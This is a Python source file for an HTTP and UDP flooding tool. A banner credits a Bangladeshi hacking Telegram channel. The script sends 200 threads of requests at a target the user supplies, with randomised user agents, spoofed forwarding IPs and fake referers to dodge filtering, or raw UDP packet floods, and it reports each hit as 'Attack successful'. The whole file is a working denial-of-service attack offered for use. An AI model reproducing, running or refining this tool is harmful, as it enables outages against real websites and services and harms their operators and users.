
import threading
import requests
import random
import string
import time
import os
import socket

# ANSI escape codes for colors
class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'

def genstr(size):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))

def send_http_request(url):
    session = requests.Session()
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36'
    ]
    
    while True:
        try:
            params = {'q': genstr(random.randint(5, 15))}
            headers = {
                'User-Agent': random.choice(user_agents),  # Random User-Agent
                'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4)),  # Simulate random IP
                'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com'])  # Random referer
            }
            response = session.get(url, params=params, headers=headers, timeout=10)  # Timeout set to 10 seconds
            status_code = response.status_code
            if status_code == 200:
                print(f"{colors.GREEN}Attack successful [{status_code}]{colors.END} Params: {params}")
            else:
                print(f"{colors.RED}Site down status code: {status_code}{colors.END} Params: {params}")
        except requests.exceptions.RequestException as e:
            print(f"{colors.RED}Request failed: {e}{colors.END}")
            time.sleep(random.randint(1, 3))  # Random backoff time between retries

def send_udp_flood(target_ip, target_port):
    message = genstr(1024).encode('utf-8')
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(message, (target_ip, target_port))
            print(f"{colors.CYAN}UDP Flooding {target_ip}:{target_port}{colors.END}")
        except Exception as e:
            print(f"{colors.RED}UDP Flood failed: {e}{colors.END}")
            time.sleep(random.randint(1, 3))  # Random backoff time between retries

def main():
    os.system('clear')
    header = f"""
{colors.RED}▒█▀▀█ ▀▄▒▄▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ {colors.END}
{colors.GREEN}▒█░░░ ░▒█░░ ▒█░░▒█ ▒█▀▀▀ ▒█▀▀▄ {colors.END}
{colors.CYAN}▒█▄▄█ ▄▀▒▀▄ ▒█▄▄▄█ ▒█░░░ ▒█▄▄█{colors.END}
=======================================
{colors.YELLOW}Our Telegram Channel: {colors.CYAN}https://t.me/CYBER_X_OF_BANGLADESH_BACKUP{colors.END}
{colors.YELLOW}Create by {colors.MAGENTA}@noinadigger{colors.END}
=======================================
"""
    print(header)
    print("Please enter your target URL or IP for the attack:")
    target = input("Target URL/IP: ").strip()

    print("Enter the type of attack (http/udp):")
    attack_type = input("Attack type: ").strip().lower()

    threads = []
    thread_count = 200  # Increase thread count for heavy load testing

    if attack_type == "http":
        for _ in range(thread_count):
            t = threading.Thread(target=send_http_request, args=(target,))
            t.start()
            threads.append(t)
    elif attack_type == "udp":
        target_ip, target_port = target.split(':')
        for _ in range(thread_count):
            t = threading.Thread(target=send_udp_flood, args=(target_ip, int(target_port)))
            t.start()
            threads.append(t)
    else:
        print(f"{colors.RED}Invalid attack type selected!{colors.END}")
        return
    
    # Wait for all threads to complete
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
